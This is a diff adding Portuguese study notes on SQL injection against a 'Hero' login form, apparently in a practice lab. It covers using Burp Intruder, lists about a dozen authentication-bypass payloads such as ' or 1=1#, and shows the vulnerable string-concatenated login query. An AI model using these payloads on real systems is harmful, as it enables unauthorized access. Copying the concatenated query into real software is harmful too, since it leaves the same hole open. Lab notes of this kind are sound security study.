@@ -1,0 +1,40 @@
+SQL Injection (Login Form /Hero)
+
+Vulnerabilidade Blind SQLi - Não conseguiremos extrair informações pela aplicação.
+    |-> No máximo, podemos obtér informações do banco de dados vendo como a aplicação se comporta.
+
+
+Utilizaremos o Burp > Mandaremos a requisição para o repeat e intruder.
+
+Intruder > clear > Escolher apenas a parte de $login$
+
+Pesquisar por lista de payloads e colocar no Intruder. Vamos colocar um injection point.
+
+--> Blind sql injection payload list github
+        |-> https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt
+
+admin' or '1'='1'#
+admin'or 1=1 or ''='
+admin' or 1=1#
+' or         0=0 #
+' or 0=0 #
+' or '1'='1'#
+' or 1=1#
+' or 1=1;#
+' or 1=1 LIMIT 1;#
+'or 1=1 or ''='
+' OR 'x'='x'#;
+'=' 'or' and '=' 'or'
+' or 1=1 limit 1 -- -+
+
+Com isso, teremos acesso como admin.
+
+
+Query: SELECT * FROM heroes WHERE login='" .$login. "' AND password='" .$password. "';
+-------------------------------------------------------------------------------------
+
+Injeção 1: ' OR 1=1#
+Query: SELECT * FROM heroes WHERE login='" .$login. "' AND password='" .$password. "';
+
+Injeção 2: bee' OR 1=1
+Query: SELECT * FROM heroes WHERE login='" .$login. "' AND password='" .$password. "';
